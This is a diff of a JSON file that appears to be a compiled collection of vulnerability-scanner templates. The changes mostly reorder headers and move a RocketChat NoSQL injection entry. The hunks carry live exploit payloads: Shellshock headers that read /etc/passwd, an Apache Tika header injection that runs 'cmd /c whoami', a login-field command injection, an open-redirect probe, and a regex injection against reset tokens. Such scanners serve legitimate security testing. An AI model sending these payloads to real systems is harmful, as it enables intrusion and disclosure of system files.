@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6756,11 +6756,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -11803,8 +11803,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -14580,6 +14580,20 @@
             "{{BaseURL}}/openx/www/delivery/lg.php?dest=http://interact.sh",
             "{{BaseURL}}/revive/www/delivery/lg.php?dest=http://interact.sh",
             "{{BaseURL}}/www/delivery/lg.php?dest=http://interact.sh"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-22911",
+      "info": {
+        "name": "RocketChat - NoSQL injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /api/v1/method.callAnon/getPasswordPolicy HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"message\": \"{\\\"msg\\\":\\\"method\\\", \\\"method\\\": \\\"getPasswordPolicy\\\", \\\"params\\\": [{\\\"token\\\": {\\\"$regex\\\": \\\"^{{randstr}}\\\"}}] }\"}"
           ]
         }
       ]
@@ -18908,20 +18922,6 @@
             "GET /images/icons_title.gif HTTP/1.1\nHost: {{Hostname}}\n",
             "DELETE /images/icons_title.gif HTTP/1.1\nHost: {{Hostname}}\n",
             "GET /images/icons_title.gif HTTP/1.1\nHost: {{Hostname}}\n"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "CVE-2021-22911",
-      "info": {
-        "name": "RocketChat - NoSQL injection",
-        "severity": "critical"
-      },
-      "requests": [
-        {
-          "raw": [
-            "POST /api/v1/method.callAnon/getPasswordPolicy HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\"message\": \"{\\\"msg\\\":\\\"method\\\", \\\"method\\\": \\\"getPasswordPolicy\\\", \\\"params\\\": [{\\\"token\\\": {\\\"$regex\\\": \\\"^{{randstr}}\\\"}}] }\"}"
           ]
         }
       ]
